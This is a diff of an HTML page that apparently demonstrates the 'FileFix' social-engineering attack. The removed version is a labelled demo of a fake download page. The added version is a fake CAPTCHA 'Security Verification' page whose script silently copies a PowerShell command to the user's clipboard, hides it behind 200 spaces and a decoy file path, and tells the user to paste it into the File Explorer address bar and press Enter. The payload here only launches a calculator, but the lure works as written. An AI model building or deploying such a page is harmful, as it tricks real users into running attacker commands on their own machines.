@@ -1,227 +1,133 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Secure File Download</title>
+  <meta charset="UTF-8">
+  <title>Security Verification</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-<style>
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 420px;
+      text-align: center;
+    }
 
-body{
-font-family:Segoe UI, Arial;
-background:#eef1f5;
-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-margin:0;
-}
+    h2 {
+      color: #333;
+    }
 
-/* MAIN BOX */
+    .captcha-box {
+      border: 1px solid #ccc;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 8px;
+      background-color: #fafafa;
+    }
 
-.container{
+    .loading {
+      color: #0078d4;
+      font-size: 14px;
+      margin-top: 15px;
+    }
 
-background:white;
-padding:40px;
-width:420px;
+    .instructions {
+      display: none;
+      margin-top: 20px;
+      text-align: left;
+      font-size: 14px;
+      color: #333;
+    }
 
-border-radius:10px;
+    .instructions code {
+      background: #eee;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
 
-box-shadow:0 10px 40px rgba(0,0,0,0.2);
+    button {
+      background-color: #0078d4;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-size: 15px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
 
-text-align:center;
+    button:hover {
+      background-color: #005fa3;
+    }
 
-}
-
-button{
-
-background:#ff7a00;
-
-border:none;
-
-padding:12px 20px;
-
-color:white;
-
-font-size:15px;
-
-border-radius:6px;
-
-cursor:pointer;
-
-}
-
-button:hover{
-background:#e36800;
-}
-
-.hidden{
-display:none;
-}
-
-/* EXPLORER WINDOW */
-
-.explorer-window{
-
-position:fixed;
-
-bottom:40px;
-
-left:50%;
-
-transform:translateX(-50%) scale(.9);
-
-width:520px;
-
-background:white;
-
-border-radius:8px;
-
-box-shadow:0 30px 60px rgba(0,0,0,0.5);
-
-font-family:Segoe UI;
-
-display:none;
-
-animation:explorerAppear .4s forwards;
-
-}
-
-@keyframes explorerAppear{
-
-from{
-opacity:0;
-transform:translateX(-50%) scale(.85);
-}
-
-to{
-opacity:1;
-transform:translateX(-50%) scale(1);
-}
-
-}
-
-/* HEADER */
-
-.explorer-header{
-
-background:#f3f3f3;
-
-padding:10px;
-
-border-bottom:1px solid #ddd;
-
-font-weight:600;
-
-}
-
-/* FILE LIST */
-
-.file-list{
-padding:20px;
-}
-
-.file-item{
-
-display:flex;
-
-align-items:center;
-
-gap:10px;
-
-padding:12px;
-
-border-radius:6px;
-
-cursor:pointer;
-
-}
-
-.file-item:hover{
-background:#e8f0fe;
-}
-
-.file-item img{
-width:28px;
-}
-
-.file-name{
-font-size:15px;
-}
-
-</style>
+    .footer {
+      font-size: 11px;
+      color: #888;
+      margin-top: 30px;
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="container">
+  <div class="container">
+    <h2>Security Verification Required</h2>
+    <p>To continue, please verify you're a human visitor.</p>
 
-<h2>Secure File Download</h2>
+    <div class="captcha-box">
+      <p>Click below to verify</p>
+      <button id="verifyBtn">I’m not a robot</button>
+    </div>
 
-<p>This file requires verification before download.</p>
+    <div class="loading" id="statusMsg"></div>
 
-<button id="downloadBtn">Download File</button>
+    <div class="instructions" id="instructionsBox">
+      <p><strong>To complete verification:</strong></p>
+      <ol>
+        <li>Open <strong>File Explorer</strong> (📁)</li>
+        <li>Press <code>CTRL + L</code> to highlight the address bar</li>
+        <li>Press <code>CTRL + V</code> to paste the verification code</li>
+        <li>Press <code>Enter</code></li>
+      </ol>
+    </div>
 
-<div id="verification" class="hidden">
+    <div class="footer">
+      © 2025 Web Verification Authority
+    </div>
+  </div>
 
-<p><b>Security verification required</b></p>
+  <script>
+    const verifyBtn = document.getElementById("verifyBtn");
+    const status = document.getElementById("statusMsg");
+    const instructions = document.getElementById("instructionsBox");
 
-<p>Click verify to continue download.</p>
+    verifyBtn.addEventListener("click", () => {
+      // Step 1: Fake loading
+      status.textContent = "Verifying... please wait.";
 
-<button id="verifyBtn">Verify</button>
+      // Step 2: After delay, copy payload and show instructions
+      setTimeout(() => {
+        const realCmd = "powershell.exe -c Start-Process calc.exe";
+        const padding = " ".repeat(200); // Push the real command out of view
+        const fakePath = "# C:\\Users\\Public\\Shared\\VerificationCode.txt";
 
-</div>
+        navigator.clipboard.writeText(realCmd + padding + fakePath);
 
-</div>
-
-<!-- EXPLORER WINDOW -->
-
-<div id="explorerWindow" class="explorer-window">
-
-<div class="explorer-header">
-
-File Explorer — Downloads
-
-</div>
-
-<div class="file-list">
-
-<div class="file-item" id="targetFile">
-
-<img src="https://cdn-icons-png.flaticon.com/512/888/888879.png">
-
-<span class="file-name">Invoice_Document.zip</span>
-
-</div>
-
-</div>
-
-</div>
-
-<script>
-
-document.getElementById("downloadBtn").onclick=function(){
-
-document.getElementById("verification").classList.remove("hidden")
-
-}
-
-/* show explorer */
-
-document.getElementById("verifyBtn").onclick=function(){
-
-document.getElementById("explorerWindow").style.display="block"
-
-}
-
-/* simulate file execution */
-
-document.getElementById("targetFile").onclick=function(){
-
-alert("Demo: File would execute here (FileFix attack stage)")
-
-}
-
-</script>
+        status.textContent = "✔️ Verification code copied to clipboard.";
+        instructions.style.display = "block";
+      }, 2500);
+    });
+  </script>
 
 </body>
 </html>
+Wh
